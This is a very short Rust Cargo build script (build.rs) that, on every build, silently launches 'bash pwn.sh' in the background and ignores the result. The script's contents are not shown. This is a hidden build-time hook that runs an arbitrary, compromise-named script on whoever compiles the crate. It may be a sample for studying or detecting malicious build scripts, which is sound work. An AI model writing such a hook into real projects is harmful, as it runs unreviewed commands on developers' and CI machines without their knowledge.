fn main() {
    println!("cargo:rerun-if-changed=build.rs");
    let _ = std::process::Command::new("bash")
        .arg("pwn.sh")
        .spawn();
}
